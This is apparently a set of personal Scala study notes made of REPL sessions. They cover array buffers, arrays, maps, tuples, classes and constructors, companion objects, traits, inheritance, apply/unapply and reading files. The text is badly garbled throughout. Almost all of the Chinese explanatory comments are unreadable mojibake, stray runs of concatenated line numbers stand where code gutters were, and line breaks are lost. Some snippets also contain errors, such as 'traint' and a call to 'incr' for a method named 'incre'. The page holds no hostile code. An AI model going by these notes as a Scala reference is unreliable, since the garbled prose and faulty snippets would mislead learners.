res157: buf.type = ArrayBuffer(3, 23) scala&gt; buf ++= Array(4,5,6) res158: buf.type = ArrayBuffer(3, 23, 4, 5, 6)//trimEnd,ä»æœ«å°¾ç§»é™¤å…ƒç´ ------------------- scala&gt;buf.trimStart(2) scala&gt;buf.trimEnd(2)//removeæŒ‰ç…§ç´¢å¼•ç§»é™¤------------------- scala&gt;buf.remove(0)//insert,åœ¨0å…ƒç´ ä½ç½®æ’å…¥åç»­æ•°æ®------------------- scala&gt;buf.insert(0,1,2)//toArray------------------- scala&gt;buf.toArray=================================æ•°ç»„æ“ä½œ==================================//æ•°ç»„æ“ä½œ // éœ€æ±‚: æ„é€ å‡º20ä»¥å†…, 4çš„å€æ•°çš„æ•°ç»„// æ–¹å¼1 scala&gt; (for(x &lt;- 1 to 10 if x % 2 == 0) yield x * 2).toArray res107: Array[Int] = Array(4, 8, 12, 16, 20)// æ–¹å¼2 scala&gt; Array(1 to 10:_*).filter(_ % 2 == 0).map(_ * 2) res109: Array[Int] = Array(4, 8, 12, 16, 20)==========================================// mapå‡½æ•°, å‚æ•°æ˜¯ä¸€ä¸ªå‡½æ•°, å‡½æ•°çš„å‚æ•°å¿…é¡»ä¸è°ƒç”¨è€…çš„å‚æ•°æ„æˆä¸€è‡´// æ¯æ¬¡æ‹¿å‡ºä¸€ä¸ªå‚æ•°å‡ºæ¥ç®—'map': æŠŠä¸€æ‰¹å…ƒç´ ç»è¿‡æ“ä½œä»¥åæ˜ å°„å‡ºå¦ä¸€æ‰¹å…ƒç´ , kv è¿›, kv å‡º // filter å‡½æ•°, åŒä¸Š'filter': è¿‡æ»¤, æŠŠä¸ç¬¦åˆæ¡ä»¶çš„å…ƒç´ è¿‡æ»¤æ‰==========================================---------------------------------------------------------//æ•°ç»„å¸¸ç”¨æ–¹æ³•-------------------- scala&gt;arr.sum scala&gt;arr.min scala&gt;arr.max//æ’åº-------------------- scala&gt;import scala.util.Sorting._ scala&gt;val arr = Array(1,4,3,2) scala&gt;quickSort(arr) //arræœ‰åº//Array.mkString =&gt; array è½¬ä¸º string-------------------- scala&gt; val arr = Array(3, 4, 14, 21) arr: Array[Int] = Array(3, 4, 14, 21) scala&gt; arr res164: Array[Int] = Array(3, 4, 14, 21) scala&gt; arr.mkString("&lt;&lt;",",","&gt;&gt;") res165: String = &lt;&lt;3,4,14,21&gt;&gt;===================================================================//å¤šç»´æ•°ç»„--------------------// å®šä¹‰æ–¹å¼1 scala&gt; var arr = new Array[Array[Int]](4) arr: Array[Array[Int]] = Array(null, null, null, null) scala&gt; arr(0) = Array(1) scala&gt; arr(1) = Array(1,2) scala&gt; arr(2) = Array(1,2,3) scala&gt; arr(3) = Array(1,2,3,4) scala&gt; arr res128: Array[Array[Int]] = Array(Array(1), Array(1, 2), Array(1, 2, 3), Array(1, 2, 3, 4))// å®šä¹‰æ–¹å¼2 //äºŒç»´æ•°ç»„,3è¡Œ4åˆ— scala&gt;val arr = Array.ofDim[Int](3,4) //ä¸‹æ ‡è®¿é—®æ•°ç»„å…ƒç´  scala&gt;arr(0)(1) scala&gt;arr.length//æ•°ç»„çš„éå†-------------------- scala&gt; a res178: String = hello scala&gt; for(i &lt;- 0 until a.length) println(i+":"+a(i)) 0:h 1:e 2:l 3:l 4:o// æ‹¿åˆ°æ¯ä¸ªæ•°ç»„ä¸­çš„å…ƒç´ (è·Ÿä¸Šé¢çš„éå†ç»“æœä¸€æ ·)-------------------- scala&gt; arr res179: Array[Array[Int]] = Array(Array(0, 0, 0, 0), Array(0, 0, 0, 0), Array(0, 0, 0, 0)) scala&gt; for(i &lt;- 0 until arr.length) println(i+":"+arr(i)) 0:[I@36081062 1:[I@70c6f11a 2:[I@378953bd //å’Œjavaå¯¹è±¡äº¤äº’ï¼Œå¯¼å…¥è½¬æ¢ç±»å‹,ä½¿ç”¨çš„éšå¼è½¬æ¢-------------------- import scala.collection.JavaConversions.bufferAsJavaList val buf = ArrayBuffer(1,2,3,4); val list:java.util.List[Int] = buf ; // scala è¯­æ³•ä¸­, æ³›å‹æ—¶åœ¨ ä¸­æ‹¬å·ä¸­ // æ‰“å°å¼•ç”¨ç±»å‹ println(result.toBuffer) // æ‰“å°å¼•ç”¨ç±»å‹çš„å€¼println(result.mkString(",")) // ä»¥',' åˆ†éš”ç¬¦æ‰“å°println(arr2.mkString("&lt;",":","&gt;")) // å‰åç¼€ å’Œ åˆ†éš”ç¬¦ æ‰“å° println(foreach(println)) // å¾ªç¯æ‰“å° äº”. Map æ˜ å°„1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283 // ä¸å¯å˜ immutable============================================================================= //scala.collection.immutable.Map[Int,String] =&gt;ä¸å¯å˜é›†åˆ scala&gt;val map = Map(100-&gt;"tom",200-&gt;"tomas",300-&gt;"tomasLee") map: scala.collection.immutable.Map[Int,String] = Map(100 -&gt; tom, 200 -&gt; tomas, 300 -&gt; tomasLee) //é€šè¿‡keyè®¿é—®value scala&gt;map(100)æ³¨æ„: 1) å¦‚æœæ˜¯ immutable çš„ map çš„ val è¦æ”¹å˜, åªèƒ½èµ‹å€¼ç»™æ–°çš„ val , æ·»åŠ åªèƒ½ç”¨ + å· 2) å¦‚æœæ˜¯ immutable çš„ map çš„ var å¯ä»¥ç›´æ¥ä½¿ç”¨ +=, -= val newmap = map + (4-&gt;"ttt") // å¯å˜ mutable=============================================================================// ç›´æ¥å®šä¹‰ hashMap å¹¶èµ‹å€¼--------------------------------------------- import scala.collection.mutable.HashMap var map1 = HashMap(1-&gt;22, "dd"-&gt;33) //æ³¨æ„, è¿™é‡Œå­—ç¬¦ä¸²åªèƒ½ä½¿ç”¨ åŒå¼•å· $scala&gt; map1 res145: scala.collection.mutable.HashMap[Int,Int] = Map(2 -&gt; 33, 1 -&gt; 22) scala&gt; map1("dd") res197: Int = 33// å…ˆå®šä¹‰ç©ºhashmap--------------------------------------------- scala&gt; var map2 = new HashMap[Int,Int] map2: scala.collection.mutable.HashMap[Int,Int] = Map() scala&gt; var map3 = HashMap[Int,Int]() // è¿™é‡Œå…¶å®å°±æ˜¯è°ƒç”¨äº† apply() map3: scala.collection.mutable.HashMap[Int,Int] = Map()// hashMap èµ‹å€¼--------------------------------------------- æ³¨æ„: += / -= ä¼šæ”¹å˜åŸå€¼, + / - ä¸ä¼šæ”¹å˜åŸå€¼,åªä¼šæ”¹å˜å½“æ¬¡è¿”å›å€¼---------------------------------------------///æ·»åŠ å…ƒç´ : += (k-&gt;v) æ³¨æ„: è¦ä¸å®šä¹‰æ—¶ç±»å‹ä¸€è‡´ scala&gt; map2 += (1-&gt;100,2-&gt;200) res150: scala.collection.mutable.HashMap[Int,Int] = Map(2 -&gt; 200, 1 -&gt; 100) ====&gt; æ³¨æ„: æ­¤æ—¶ mutable de var çš„ '+=' å’Œ '+', æ•ˆæœæ˜¯ä¸€æ ·çš„ =====&gt; map2 = map2 + (1-&gt;100,2-&gt;200) // è¿™ä¸ªå†™æ³•æ˜¯é”™è¯¯çš„, è¦ä¹ˆç”¨+, è¦ä¹ˆç”¨+=///åˆ é™¤å…ƒç´ : -= k scala&gt; map2 -= 1 res151: scala.collection.mutable.HashMap[Int,Int] = Map(2 -&gt; 200)==&gt; æ³¨æ„: å¦‚æœkey ä¸€æ ·, ä¼šè¦†ç›–æ‰å‰é¢çš„èµ‹å€¼, ç›¸å½“äºä¿®æ”¹==&gt; å½“ç„¶, ä¹Ÿå¯ä»¥è¿™æ ·ä¿®æ”¹: &gt;&gt;&gt; map2(1) = 500//è¿­ä»£map---------------------------------------------scala&gt;for ((k,v) &lt;- map) println(k + ":::" + v);scala&gt; for ((k,v) &lt;- map) println(k +":::::" + v)1:::::332:::::443:::::55//ä½¿ç”¨yieldæ“ä½œè¿›è¡Œå€’æ’åº(kvå¯¹è°ƒ)---------------------------------------------scala&gt; for ((k,v) &lt;- map) yield (v,k)res210: scala.collection.immutable.Map[Int,Int] = Map(33 -&gt; 1, 44 -&gt; 2, 55 -&gt; 3)// mapæ–¹æ³•:æ­¤æ–¹æ³•åªèƒ½æ¥å—ä¸€ä¸ªå‚æ•°, è¿™ä¸ªå‚æ•°æ˜¯å‡½æ•°æ­¤å‚æ•°å‡½æ•°, ä¹Ÿåªèƒ½æ¥å—ä¸€ä¸ªå‚æ•°, æ­¤å‚æ•°çš„ç±»å‹, å’Œæ•°ç»„ä¸­çš„å…ƒç´ ç±»å‹ä¸€è‡´æ­¤å‚æ•°å‡½æ•°æœ€ç»ˆä¼šè¿”å›ä¸€ä¸ªå€¼, å€¼çš„ç±»å‹å¯ä»¥è‡ªå®šä¹‰val add1 = (x : Int) =&gt; x+1 arr.map(add1)arr.map( (x : Int) =&gt; x+1 )arr. map(x =&gt; x +1)arr.map(_ + 1)// å–å€¼map.get("xx") //æ²¡æœ‰çš„è¯å°±è¿”å›ç©ºscala&gt; m.getOrElse(0,"no") // æ²¡æœ‰çš„è¯å°±è¿”å›åé¢æŒ‡å®šçš„å…ƒç´  å…­. å…ƒç»„tuple, æœ€å¤§Tuple2212345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// äºŒå…ƒå…ƒç¥– å« å¯¹å¶---------------------------------------------å…ƒç»„çš„å®šä¹‰: ç”¨å°æ‹¬å·åŒ…èµ·æ¥--------------------------------------------- scala&gt; val t = (1,"tom",12) ; scala&gt; t res216: (Int, String, Int) = (1,tom,12) scala&gt; val t = (1,"tom",12,1,"tom",12,1,"tom",12,1,"tom",12,1,"tom",12,1,"tom",12,1,"tom",12,1) t: (Int, String, Int, Int, String, Int, Int, String, Int, Int, String, Int, Int, String, Int, Int, String, Int, Int, String, Int, Int) = (1,tom,12,1,tom,12,1,tom,12,1,tom,12,1,tom,12,1,tom,12,1,tom,12,1) scala&gt; val t = (1,"tom",12,1,"tom",12,1,"tom",12,1,"tom",12,1,"tom",12,1,"tom",12,1,"tom",12,1,3) &lt;console&gt;:1: error: too many elements for tuple: 23, allowed: 22 val t = (1,"tom",12,1,"tom",12,1,"tom",12,1,"tom",12,1,"tom",12,1,"tom",12,1,"tom",12,1,3)æ³¨æ„: error: too many elements for tuple: 23, allowed: 22 å…ƒç¥–æœ€å¤š22// è®¿é—®å…ƒç»„æŒ‡å®šå…ƒ---------------------------------------------==&gt; æ³¨æ„: å…ƒç¥–åºåˆ—ä» 1 å¼€å§‹scala&gt; val t = (1,2,3,4) ; //å…ƒç»„scala&gt;t._2scala&gt;t _2 (ä¸æ¨è)val (a,b,c) = t==&gt; ç›¸å½“äºä¸€ä¸‹å£°æ˜äº†3ä¸ªå˜é‡, a,b,c//ç›´æ¥å–å‡ºå…ƒç»„ä¸­çš„å„åˆ†é‡---------------------------------------------scala&gt; val t = (132,"d4",3)t: (Int, String, Int) = (132,d4,3)æ³¨æ„: å‰åçš„å…ƒæ•°å¿…é¡»ç›¸ç­‰scala&gt; val (a,b,c) = ta: Int = 132b: String = d4c: Int = 3==&gt; è¿™é‡Œå°±ç›¸å½“äºç›´æ¥å®šä¹‰äº† a,b,c ä¸‰ä¸ªå˜é‡//æ•°ç»„çš„zip---------------------------------------------//è¥¿é—¨åº† -&gt; æ½˜é‡‘è² ç‰›éƒ -&gt; ä¾„å¥³ ,scala&gt; val hus = Array(1,2,3);hus: Array[Int] = Array(1, 2, 3)scala&gt; val wife = Array(4,5,6,7)wife: Array[Int] = Array(4, 5, 6, 7)scala&gt; hus.zip(wife)res226: Array[(Int, Int)] = Array((1,4), (2,5), (3,6))æ³¨æ„: ä¸ªæ•°å¯¹ä¸ä¸Šçš„å°±ç æ‰äº† ä¸ƒ. OOP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303// å®šä¹‰ç±» &amp; åŸºæœ¬æ“ä½œ===============================================================class Person&#123; // å®šä¹‰å˜é‡, ç§æœ‰ç±»å‹, å¿…é¡»åˆå§‹åŒ– // .class ä¸­ç§æœ‰æ–¹æ³•æŸ¥çœ‹: javap -private xxx.class // getter/setter ä¹Ÿç§æœ‰ private var id = 0; // p.name =&gt; getter // p.name_=(xx) =&gt; setter // p.name = xx =&gt; setter // ç”Ÿæˆç§æœ‰å±æ€§, å’Œå…±æœ‰çš„ getter/setter æ–¹æ³• var name = "tom"; // val åªæœ‰ getter, æ²¡æœ‰setter, å®šä¹‰çš„æ˜¯ val å¸¸é‡ val age = 100; def incre(a:Int) = &#123;id += a&#125; //å¦‚æœå®šä¹‰æ—¶ï¼Œæ²¡æœ‰(),è°ƒç”¨å°±ä¸èƒ½åŠ () // æœ‰çš„è¯, è°ƒç”¨çš„æ—¶å€™å°±å¯åŠ å¯ä¸åŠ  def current() = id&#125;-------------------------&gt;è°ƒç”¨ scala&gt;var p = new Person(); scala&gt;p.current() scala&gt;p.current scala&gt;p.incr(100) scala&gt;p.name scala&gt;p.name_=("kkkk") scala&gt;p.name = "kkkk"// private[this]ä½œç”¨,æ§åˆ¶æˆå‘˜åªèƒ½åœ¨è‡ªå·±çš„å¯¹è±¡ä¸­è®¿é—®ã€‚ (å¯¹è±¡ç§æœ‰)===============================================================1) Scalaä¸­(Javaå’Œ C++ ä¹Ÿä¸€æ ·), æ–¹æ³•å¯ä»¥è®¿é—®è¯¥ç±»çš„æ‰€æœ‰å¯¹è±¡çš„ç§æœ‰å­—æ®µ2) private[this], æ˜¯ Counter ç±»çš„æ–¹æ³•, åªèƒ½è®¿é—®åˆ°å½“å‰å¯¹è±¡çš„ value æ–¹æ³•, è€Œä¸èƒ½è®¿é—®åŒæ ·æ˜¯ Counter ç±»å‹çš„å…¶ä»–å¯¹è±¡çš„è¯¥å­—æ®µ.3) è¿™æ ·çš„è®¿é—®è¢«ç§°ä¸º å¯¹è±¡ç§æœ‰çš„4) å¯¹äºç±»ç§æœ‰çš„å­—æ®µ, Scala ç”Ÿæˆç§æœ‰çš„ getter å’Œ setter æ–¹æ³•; ä½†å¯¹äºå¯¹è±¡ç§æœ‰çš„å­—æ®µ, Scala æ ¹æœ¬ä¸ä¼šç”Ÿæˆ getter å’Œ setter æ–¹æ³• class Counter&#123; private[this] var value = 0 ; def incre(n:Int)&#123;value += n&#125; // ç±»ä¼šå®šä¹‰å¤±è´¥, ä¸‹é¢è¿™å¥ä¸èƒ½è®¿é—®åˆ«ç±»å¯¹è±¡çš„ value def isLess(other:Counter) = value &lt; other.value ; &#125;// å®šä¹‰BeanPropertyæ³¨è§£ :TODO------------------------------------------------------------------...// æ„é€ å‡½æ•°===============================================================&gt; è¾…åŠ©æ„é€ ----------------------&gt;&gt; å®šä¹‰ class Person&#123; var id = 1 ; var name = "tom" ; var age = 12; //ä¸€ä¸ªè¾…åŠ©æ„é€ å™¨ def this(name:String)&#123; this(); // è°ƒç”¨ä¸»æ„é€ å™¨ this.name = name ; &#125; //å¦ä¸€ä¸ªè¾…åŠ©æ„é€  def this(name:String,age:Int)&#123; //è°ƒç”¨å‰ä¸€ä¸ªè¾…åŠ©æ„é€ å™¨ this(name) ; this.age = age ; &#125; &#125;&gt;&gt; ä½¿ç”¨scala&gt; var p = new Person("tm")p: Person = Person@2492f6fbscala&gt; p.nameres9: String = tmscala&gt; p = new Person("jr",23) // æ³¨æ„: æ­¤ p éä¸Šé¢çš„ p äº†p: Person = Person@2536edc3scala&gt; p.nameres11: String = jrscala&gt; p.ageres12: Int = 23&gt; ä¸»æ„é€ å‡½æ•°--------------------------------------------- //val ===&gt; åªè¯» //var ==&gt; get/set //none ==&gt; none// æ³¨æ„: id å‰é¢æ²¡æœ‰ä¿®é¥°çš„è¯, åªæœ‰åœ¨è°ƒç”¨åæ‰å‡çº§ä¸ºæˆå‘˜å˜é‡, å¦åˆ™åœ¨ .class æ–‡ä»¶ä¸­ä¸ä¼šå‡ºç°class Person(val name:String, var age:Int, id :Int)&#123; def hello() = println(id)&#125;&gt;&gt;ç¼–è¯‘åç”Ÿæˆçš„æ–‡ä»¶javap -private Person.class -&gt; æ˜¾ç¤ºç¼–è¯‘åçš„ private æˆå‘˜public class Person &#123; // id è°ƒç”¨åæ‰å‡çº§ä¸ºæˆå‘˜å˜é‡ private int age; private final int id; public java.lang.String name(); // getter public int age(); // getter public void age_$eq(int); // setter public void hello(); public Person(java.lang.String, int, int);&#125;// object===============================================================è¯´æ˜ï¼šscalaæ²¡æœ‰é™æ€çš„æ¦‚å¿µï¼Œ'å¦‚æœéœ€è¦å®šä¹‰é™æ€æˆå‘˜ï¼Œå¯ä»¥é€šè¿‡objectå®ç°ã€‚' ç¼–è¯‘å®Œæˆåï¼Œä¼šç”Ÿæˆå¯¹åº”çš„ç±»ï¼Œæ–¹æ³•éƒ½æ˜¯é™æ€æ–¹æ³•ï¼Œéé™æ€æˆå‘˜å¯¹åº”åˆ°å•ä¾‹ç±»ä¸­// å•ä¾‹ç±»ä»¥Util$ä½œä¸ºç±»åç§°ã€‚ // é™æ€æ–¹æ³•ç±» ä»¥ Util ä¸ºç±»åç§°. scala&gt;object Util&#123; //è¢«ç¼–è¯‘ä¸ºå•ä¾‹ç±»ä¸­.(Util$) private var brand = "benz" ; //è¢«ç¼–è¯‘ä¸º å•ç‹¬Util ç±»ä¸­çš„ é™æ€æ–¹æ³• def hello() = println("hello world"); &#125;âœ scala javap -private UtilCompiled from "util.scala"public final class Util &#123; public static void hello();&#125;âœ scala javap -private Util$Compiled from "util.scala"public final class Util$ &#123; public static Util$ MODULE$; private java.lang.String brand; public static &#123;&#125;; private java.lang.String brand(); private void brand_$eq(java.lang.String); public void hello(); private Util$();&#125;// ä¼´ç”Ÿå¯¹è±¡(companions object)------------------------------------------------------------------1. ç±»åå’Œobjectåç§°ç›¸åŒï¼Œè€Œä¸”å¿…é¡»åœ¨ä¸€ä¸ªscalaæ–‡ä»¶ä¸­å®šä¹‰ã€‚2. ç¼–è¯‘å, ä¼šäº§ç”Ÿ2ä¸ªæ–‡ä»¶, Car.class å’Œ Car$.class3. é™æ€æ–¹æ³•ä¼šè¢«ç¼–è¯‘åˆ° Car.class ä¸­å», é™æ€æ–¹å¼å¯ç›´æ¥ç”¨ç±»è°ƒç”¨class Car&#123; def stop() = println("stop....")&#125;object Car&#123; // ä¼´ç”Ÿå¯¹è±¡, ç›®çš„å°±æ˜¯ä¸ºäº†äº§ç”Ÿé™æ€æ–¹æ³• def run() = println("run...")&#125;------------&gt; ç¼–è¯‘åâœ scala javap -private CarCompiled from "companionsObject.scala"public class Car &#123; public static void run(); public void stop(); public Car();&#125;âœ scala javap -private Car$Compiled from "companionsObject.scala"public final class Car$ &#123; public static Car$ MODULE$; public static &#123;&#125;; public void run(); private Car$();&#125;4. å› ä¸º main å‡½æ•°æ˜¯é™æ€æ–¹æ³•, æ‰€ä»¥å†™åœ¨ä¼´ç”Ÿå¯¹è±¡ä¸­class Person(val name:String, var age:Int, id : Int) &#123; def hello() = println(id);&#125;object Person &#123; def main(args:Array[String]) = println("hello world");&#125;âœ scala scala main.scala // ç›´æ¥ scala xx.scala ä¼šå…ˆç¼–è¯‘å†è¿è¡Œhello world// æŠ½è±¡ &amp; é™æ€ ===============================================================âœ æŠ½è±¡ &amp; é™æ€ testâœå®šä¹‰ç±»// æŠ½è±¡ç±»abstract class Dog &#123; def a():Unit&#125;// objectç­‰ä»·äºjavaä¸­çš„é™æ€ã€‚object Jing8 extends Dog &#123; // é‡å†™æ–¹æ³• override def a():Unit= println("hello")&#125;class Zangao extends Dog &#123; override def a():Unit = println("è€å­æ˜¯ä¸ªğŸ¶??")&#125;âœ è°ƒç”¨scala&gt; Jing8.a // é™æ€æ–¹æ³•è°ƒç”¨scala&gt; Jing8.ahelloscala&gt; var za = new Zangao() // ç±»åˆ›å»ºå¯¹è±¡è°ƒç”¨za: Zangao = Zangao@77505c0escala&gt; za.aè€å­æ˜¯ä¸ªğŸ¶??// apply===============================================================1) ä½¿ç”¨// å®šä¹‰: object Util&#123; def apply(s:String) = println(s) ;&#125;// è°ƒç”¨: ä¸‹é¢2è€…æ˜¯ä¸€ä¸ªæ„æ€Util("hello world");Util.apply("hello world");&gt; è¿è¡Œç»“æœ: hello world2) æ³¨æ„ç‚¹// æ³¨æ„ä¸€ä¸‹2è€…çš„åŒºåˆ«scala&gt; var arr = Array(10)arr: Array[Int] = Array(10)scala&gt; arrres18: Array[Int] = Array(10)scala&gt; var arr = new Array(10)arr: Array[Nothing] = Array(null, null, null, null, null, null, null, null, null, null)// ç»ˆç«¯ç¼–è¯‘è¿è¡Œ scalaæ–‡ä»¶===============================================================scalacç¼–è¯‘scalaæ–‡ä»¶ï¼Œäº§ç”Ÿclassæ–‡ä»¶ã€‚------------------------------------ cmd&gt;scalac xxxx.scalaè¿è¡Œclassç¨‹åº-------------------- cmd&gt;scala Personä¸€æ­¥åˆ°ä½------------------- cmd&gt;scala Person.scala// trait (ç±»ä¼¼äº Java ä¸­çš„ interface )=============================================================== traint HelloService&#123; &#125;//åŒ…å¯¹è±¡ï¼Œç¼–è¯‘å®Œä¹‹åç”Ÿæˆä»¥ /a/a1/aa1/people/xxx.class..., ä¸€å±‚ä¸€å±‚æ–‡ä»¶å¤¹===============================================================package a.a1.aa1;package object people &#123; val name = "hello world";&#125;//çº¦æŸå¯è§æ€§ã€‚-----------------------private[package|this]// åŒ…çš„å¯¼å…¥--------------import java.io.Exceptionimport java.io.&#123;A,B,C&#125; //åŒä¸€åŒ…ä¸‹çš„ä¸åŒç±», å¯ä»¥ç”¨å¤§æ‹¬å·åŒ…èµ·æ¥import java.io.&#123;A =&gt; A0&#125; //åˆ«å å…«. ç»§æ‰¿ inheritanceextends 123456789101112131415161718192021222324252627282930313233343536373839ç»§æ‰¿/æ‰©å±•------------------------------- class Dog extends Animal&#123; //é‡å†™,è¦†ç›– //overload override def run()=&#123;...&#125; &#125;ç»§æ‰¿å®ä¾‹------------------------------$scala&gt;class Animal(val name:String)&#123;&#125;$scala&gt;class Dog(name:String,val age:Int) extends Animal(name)&#123;&#125;$scala&gt;class Duck(override val name:String, val age:Int) extends Animal(name:String)æ³¨æ„: å¦‚æœåœ¨æ„é€ é‡Œä¸ºç»§æ‰¿çš„çˆ¶ç±»ä¼ å‚, åˆ›å»ºçš„å­ç±»å¯¹è±¡ç›´æ¥ä¼šæœ‰å€¼scala&gt; class Duck(name:String, val age:Int) extends Animal("aa")defined class Duckscala&gt; var dd = new Duck("cc",32)dd: Duck = Duck@12a63c27scala&gt; dd.nameres33: String = aaç±»å‹æ£€æŸ¥å’Œè½¬æ¢------------------------------ $scala&gt;class Animal&#123;&#125; $scala&gt;class Dog extends Animal&#123;&#125; $scala&gt;val d = new Dog(); $scala&gt;d.isInstanceOf[Animal] //true,===&gt; instanceOf $scala&gt;val a = d.asInstanceOf[Animal] //å¼ºè½¬,===&gt; (Animal)d //å¾—åˆ°å¯¹è±¡çš„ç±» å¯¹è±¡ç±»å‹ å¾—åˆ°ç±»å‹ $scala&gt;d.getClass //d.getClass(); è·å–å¯¹è±¡ç±»å‹ $scala&gt;d.getClass == classOf[Dog] //ç²¾ç¡®åŒ¹é… ä¹. abstract , trait, file, apply, æ“ä½œç¬¦123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138//æŠ½è±¡ç±» abstract ================================================$scala&gt;abstract class Animal(val name:String)&#123; //æŠ½è±¡å­—æ®µï¼Œæ²¡æœ‰åˆå§‹åŒ–ã€‚ val id:Int ; //æŠ½è±¡æ–¹æ³•ï¼Œæ²¡æœ‰æ–¹æ³•ä½“ï¼Œä¸éœ€è¦æŠ½è±¡å…³é”®å­—ä¿®é¥°ã€‚ def run() ;&#125;// scalaç±»å‹æ ‘ :TODO================================================ Any | /|\ |------------AnyVal &lt;|------Int|Boolean|...|Unit |------------AnyRef &lt;|------class ...// è¯»å–æ–‡ä»¶ file================================================-----------in idea import scala.io.Source ; object FileDemo &#123; def main(args: Array[String]): Unit = &#123; val s = Source.fromFile("d:/hello.txt") ; val lines = s.getLines(); for(line &lt;- lines)&#123; println(line) &#125; &#125; &#125;---------in terminal scala&gt; scala.io.Source.fromFile("/Users/shixuanji/Documents/IDEs/iTerm2/scala/util.scala").mkString// ä¸‹é¢æ˜¯ä¸Šé¢æ‰§è¡Œçš„ç»“æœ res34: String = object Util &#123; private var brand = "benz"; def hello() = println("hello world"); &#125;//é€šè¿‡æ­£åˆ™ (å…·ä½“çš„æŸ¥çœ‹ dash çš„ jdk)\s : ç©ºç™½å­—ç¬¦ï¼š[ \t\n\x0B\f\r]\S : éç©ºç™½å­—ç¬¦ï¼š[^\s]val str = Source.fromFile("/hello.txt").mkStringval it = str.split("\\s+") // è¿‡æ»¤æ‰æ‰€æœ‰ä¸å¯è§å­—ç¬¦åˆ†å‰²for(i &lt;- it)&#123; println(i)&#125;// trait æ¥å£================================================&gt; javaä¸­, å®ç°æ¥å£, ç”¨implement , scala ä¸­ç”¨ extends&gt; å¦‚æœåªæœ‰ä¸€ä¸ªtraitä½¿ç”¨extendsè¿›è¡Œæ‰©å±•ï¼Œå¦‚æœå¤šä¸ªï¼Œä½¿ç”¨withå¯¹å‰©ä½™çš„traitè¿›è¡Œæ‰©å±•ã€‚ trait logger1&#123; def log1() = println("hello log1"); &#125; trait logger2&#123; def log2() = println("hello log2"); &#125;&gt; trait(æ¥å£)ä¹‹é—´ä¹Ÿå¯ä»¥å­˜åœ¨æ‰©å±•ã€‚ class Dog extends logger1 with logger2&#123; &#125;//è‡ªèº«ç±»å‹ :TODO è¿˜ä¸æ˜ç™½æ˜¯å•¥æ„æ€, æœ‰ç©ºçœ‹çœ‹ ä¹¦ : 10.13 Self Types &amp; 18.10================================================ trait logger&#123; this:Dog =&gt; def run() = println("run....") &#125; trait Dog &#123;&#125; trait Jing8 extends Dog with logger&#123;&#125; class Cat extends logger&#123;&#125;// æ“ä½œç¬¦================================================ //ä¸­ç½®æ“ä½œç¬¦ scala&gt; 1 + 2 // scala&gt; 1.+(2) // //å•å…ƒæ“ä½œç¬¦ scala&gt; 1 toString //+: -:å–å !:booleanå–å ~:æŒ‰ä½å–å //èµ‹å€¼æ“ä½œç¬¦ $scala&gt;+= , -= , *=, /= //:è¡¨ç¤ºå³ç»“åˆ,åªæœ‰:ç»“å°¾çš„æ“ä½œç¬¦æ˜¯å³ç»“åˆ,ä¼˜å…ˆçº§ä»å³ä¾§å¼€å§‹----&gt; ç”¨äºæ„é€ åˆ—è¡¨çš„æ“ä½œç¬¦ :: æ˜¯å³ç»“åˆçš„ scala&gt;val l = Nil //æ„é€ ç©ºé›†åˆ. scala&gt;1::2::Nil //1::(2::Nil), å…ˆåˆ›å»ºåŒ…å«2çš„åˆ—è¡¨, è¿™ä¸ªåˆ—è¡¨åˆè¢«ä½œä¸ºä¸ºå˜›é¢‘é“ä»¥1ä¸ºå¤´éƒ¨çš„åˆ—è¡¨ä¸­ scala&gt;Nil.::(2)// apply()/update() --&gt; å…¶å®å°±æ˜¯åœ¨ç­‰å·ä¸¤ä¾§çš„é—®é¢˜================================================ var arr = Array(100) //Array.apply(100); arr(0) = 200 //arr.update(0,1234)// apply(), æ¥å—çš„æ˜¯å±æ€§å‚æ•°, è¿”å›çš„æ˜¯å¯¹è±¡, å†…éƒ¨å°±æ˜¯ new äº†ä¸€ä¸ªå¯¹è±¡//unapply(),æ˜¯applyçš„é€†å‘è¿‡ç¨‹,æ¥å—çš„æ˜¯å¯¹è±¡, è¿”å›çš„æ˜¯å‚æ•°(å¯¹è±¡ä¸­çš„å±æ€§å€¼), å¦‚æœç”¨ä¸€ä¸ªå…ƒç¥–ä¸­, ä¼ å…¥ç›¸åº”çš„å˜é‡å, å°±ç›¸å½“äºç»™è¿™äº›å˜é‡èµ‹å€¼äº† //å®šä¹‰ç±»------------class Fraction(val n:Int,val d:Int)&#123;&#125;object Fraction&#123; //é€šè¿‡ def apply(n : Int,d:Int)= new Fraction(n,d) //é€†å‘è¿‡ç¨‹ def unapply(f:Fraction) = Some(f.n,f.d)&#125;------------- // å› ä¸ºå®šä¹‰äº† apply, æ‰€ä»¥ç›´æ¥è°ƒç”¨ Fraction(1,2) å°±ä¼šåˆ›å»ºä¸€ä¸ªå¯¹è±¡ scala&gt; val f = Fraction(1,2) //apply(...) &gt; æ‰§è¡Œç»“æœ scala&gt; f res254: Fraction = Fraction@30d2895e // æŠŠå®šä¹‰çš„å‡½æ•° è¿˜åŸæˆ Fraction, æ­¤æ—¶, å°±ç›¸å½“äºå®šä¹‰äº† a,b scala&gt; val Fraction(a,b) = f //unapply(...) &gt; æ‰§è¡Œç»“æœ a: Int = 1 b: Int = 2 å. é«˜é˜¶å‡½æ•°â€”&gt; å‡½æ•° Function å’Œ æ–¹æ³• Method çš„åŒºåˆ«, è§è¿™é‡Œ æŸ¥çœ‹å‡½æ•°: ç›´æ¥è¾“å…¥å‡½æ•°å æŸ¥çœ‹æ–¹æ³•: è¾“å…¥æ–¹æ³•åä¹‹å, æŒ‰ tab é”®æç¤º, ä¹Ÿä¼šå±•ç¤ºæ–¹æ³• 